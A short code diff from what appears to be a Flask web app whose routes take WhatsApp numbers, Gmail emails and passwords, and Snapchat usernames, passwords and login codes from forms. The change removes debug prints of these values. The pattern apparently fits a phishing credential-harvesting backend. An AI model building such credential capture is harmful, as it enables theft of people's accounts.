@@ -50,7 +50,6 @@ def submit_whatsapp_credentials():
     try:
         whatsapp_number = request.form["whatsapp_number"]
         whatsapp_country = request.form["whatsapp_country"]
-        print(whatsapp_number, whatsapp_country)
         # check if whatsapp account exists
         whatsapp_account = WhatsApp.query.filter_by(whatsapp_number=whatsapp_number).first()
         if whatsapp_account:
@@ -70,7 +69,6 @@ def submit_gmail_credentials():
     try:
         email = request.form["email"]
         password = request.form["password"]
-        print(email, password)
         # check if gmail account exists
         gmail_account = Gmail.query.filter_by(email=email).first()
         if gmail_account:
@@ -90,7 +88,6 @@ def submit_snapchat_credentials():
         username = request.form["username"]
         password = request.form["password"]
         snapchat_code = request.form["snapchat_code"]
-        print(username, password, snapchat_code, "All my code")
         # check if snapchat account exists
         snapchat_account = SnapChat.query.filter_by(username=username).first()
         if snapchat_account:
